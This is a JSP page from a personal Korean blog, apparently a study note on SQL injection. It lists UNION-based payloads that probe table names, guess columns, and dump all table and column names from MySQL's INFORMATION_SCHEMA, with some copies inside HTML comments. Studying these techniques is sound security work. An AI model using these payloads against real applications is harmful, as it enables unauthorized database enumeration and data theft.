<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/base.v01.css">
<title>jwmoon blog</title>
</head>
<body>
	<header>
		<h1><a href="#">문재웅의 블로그</a></h1>
	</header>
	
	<section>
	<h1>유추를 통해 비밀정보 알아내기</h1>
	<p>
	1. 테이블명 유추 <br/>
	기본 패턴: 'union select * from [확인하고자 할 테이블명] --<br/>
	DB가 Oracle이냐 MySQL이냐에 따라서 뒤의 주석구문등을 변경해서 사용가능하다.<br/>
	존재하지 않는 테이블일 경우 다음과 같은 결과가 출력된다.<br/>  
	<img src="phase1.PNG" /> <br/>
	
	존재하는 테이블일 경우 다음과 같이 출력. <br/>
	<img src="phase1-2.PNG" />
	</p>
	
	<p>
	2. 칼럼명 유추 <br/>
	기본 패턴 : ' union select * from member a having 1=1 # <br/>
	응용 패턴 : ') union select a.*,0 from member a having 1=1 #
	
	</p>
	<!-- 
	') union select a.*,0 from member a having 1=1 #
	 -->
	 <!-- 전체 테이블 리스트 뽑아오는 공격문자열  
	 ') union SELECT 1000, table_Schema, table_name, sysdate(), 0, 'Y' FROM INFORMATION_SCHEMA.TABLES #
	 
	 -->
	 <div class="mw-highlight mw-highlight-console">
	 <pre>
	 ') union SELECT 1000, table_Schema, table_name, sysdate(), 0, 'Y' FROM INFORMATION_SCHEMA.TABLES #
	 </pre>
	 </div>
	 <!-- 전체 테이블 칼럼 리스트 뽑아오는 공격문자열  
	 ') union select 1000, TABLE_NAME, COLUMN_NAME, sysdate(), 0, 'Y' from INFORMATION_SCHEMA.COLUMNS  #
	 
	 -->
	 </section>
	 <footer>Copyright © 2016 All Rights</footer>
</body>
</html>